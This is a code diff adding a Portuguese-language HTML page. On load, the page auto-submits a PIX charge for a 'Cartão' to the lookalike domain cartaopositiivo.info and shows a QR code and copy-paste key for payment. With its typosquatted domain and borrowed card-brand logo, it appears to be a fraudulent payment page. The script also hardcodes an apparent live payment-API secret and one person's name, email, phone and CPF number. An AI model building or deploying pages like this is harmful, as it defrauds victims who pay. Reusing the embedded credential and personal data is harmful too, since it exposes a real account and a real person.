@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <style>
+        /* Seu estilo aqui */
+    </style>
+</head>
+
+<body>
+<div style="display: grid; grid-template-areas: 'top-bar' 'content' 'footer'; grid-template-rows: auto 1fr auto; min-height: 100vh;">    
+    <div class="header">
+        <img decoding="async" style="width: 120px;" src="https://d9hhrg4mnvzow.cloudfront.net/lp.posicard.com.br/834c63b6-logo-branco2_105e038000000000000000.png" alt="Imagem Centralizada">
+    </div>
+
+    <div style="grid-area: content; padding: 0 1rem;"> 
+        <div style="margin-top: 18px;" class="main-content" id="formulario">
+            <div id="loader" style="display: none; text-align: center; margin-bottom: 15px;">
+                <i class="fas fa-spinner fa-spin" style="font-size: 2em; color: #e6007e;"></i>
+            </div>
+        </div>
+    </div> 
+</div>
+
+<footer>
+    <div class="footer-content">
+        <img src="https://i.postimg.cc/G90L41CR/56120104-3021981927815553-9174618497278279680-n-removebg-preview.png" alt="Logo">
+    </div>
+</footer>
+
+<script>
+    // Executa automaticamente ao carregar a página
+    window.onload = function() {
+        // Mostrar loader enquanto a requisição é processada
+        document.getElementById('loader').style.display = 'block';
+
+        // Dados da transação
+        const transactionData = {
+            customer: {
+                name: "Gabriela Martins",
+                email: "gabi_rio@gmail.com",
+                phone: "11993692132",
+                document: {
+                    type: "cpf",
+                    number: "50331722046"
+                }
+            },
+            paymentMethod: "pix",
+            pix: {
+                expiresInDays: 1
+            },
+            items: [
+                {
+                    title: "Cartão",
+                    unitPrice: 2790,
+                    quantity: 1,
+                    externalRef: "sim"
+                }
+            ],
+            amount: 2790
+        };
+
+        const basicAuth = 'Basic ' + btoa('pa_live_NFV3YkZ6MXhsZ1VCR0E1:x');
+
+        // Fazer a requisição
+        fetch('https://cartaopositiivo.info/proxy/transaction', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        'Authorization': basicAuth
+    },
+    body: JSON.stringify(transactionData)
+})
+.then(response => {
+    console.log("Status da resposta:", response.status);
+    if (!response.ok) {
+        if (response.status === 404) {
+            throw new Error('Recurso não encontrado (404)');
+        }
+        return response.json().then(err => {
+            console.error("Erro na resposta:", err);
+            throw new Error(`Erro ${response.status}: ${err.message || err.error}`);
+        });
+    }
+    return response.json();
+})
+.then(data => {
+    console.log("Dados recebidos:", data);
+    renderQRCode(data.pix.qrcode, data.amount);
+})
+.catch(error => {
+    console.error('Erro no fetch:', error);
+    // Renderiza uma mensagem de erro mais amigável
+    renderQRCode(null, transactionData.amount, error.message);
+})
+.finally(() => {
+    document.getElementById('loader').style.display = 'none';
+});
+
+
+
+        // Função para renderizar o QR Code e os dados
+        function renderQRCode(pixCode, amount, errorMessage = null) {
+            const qrCodeHTML = pixCode 
+                ? `<img style="width:200px; height:200px" src="https://api.qrserver.com/v1/create-qr-code/?data=${encodeURIComponent(pixCode)}&size=200x200" class="img-fluid">`
+                : `<p style="color: red;">${errorMessage ? errorMessage : 'Erro ao gerar o QR Code'}</p>`;
+
+            document.getElementById('formulario').innerHTML = `
+                <div class="compra-status">
+                    <div class="app-alerta-msg mb-2">
+                        <h3 class="app-alerta-msg--titulo">${errorMessage ? 'Erro ao gerar pagamento!' : 'Aguardando Pagamento!'}</h3>
+                        <p>${errorMessage ? 'Tente novamente mais tarde.' : 'Finalize o pagamento'}</p>
+                    </div>
+                    <hr class="my-2">
+                </div>
+                <div class="compra-pagamento">
+                    <div class="pagamentoQrCode text-center">
+                        <div class="app-card card rounded-top rounded-0 shadow-none border-bottom">
+                            <div class="card-body">
+                                <div class="pagamento-rapido--progress">
+                                    <div class="progress bg-dark bg-opacity-50">
+                                        <div class="progress-bar bg-danger" role="progressbar" style="width: 14.7778%;"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="app-card card rounded-bottom rounded-0 border-dark mb-2">
+                            <div class="card-body">
+                                <div class="row justify-content-center mb-2">
+                                    <div class="col-12 text-start">
+                                        <div class="mb-1"><span class="font-xs">Valor: </span><span class="badge bg-success badge-xs">R$ ${(amount / 100).toFixed(2)}</span></div>
+                                        <div class="mb-1"><span class="badge bg-success badge-xs">1</span><span class="font-xs"> Copie o código PIX abaixo.</span></div>
+                                        <div class="input-group mb-2">
+                                            <input id="pixCopiaCola" type="text" class="form-control" value="${pixCode || '---'}" readonly>
+                                            <div class="input-group-append">
+                                                <button onclick="copyPix()" class="app-btn btn btn-success rounded-0">Copiar</button>
+                                            </div>
+                                        </div>
+                                        <p><span class="badge bg-success">3</span> <span class="font-xs">Selecione a opção PIX cópia e cola, cole a chave copiada e confirme o pagamento.</span></p>
+                                    </div>
+                                </div>
+                                <div id="img-qrcode" class="text-center">
+                                    ${qrCodeHTML}
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            window.copyPix = function() {
+                const copyText = document.getElementById("pixCopiaCola");
+                copyText.select();
+                document.execCommand("copy");
+                alert("Chave PIX copiada com sucesso!");
+            };
+        }
+    };
+</script>
+</body>
+</html>
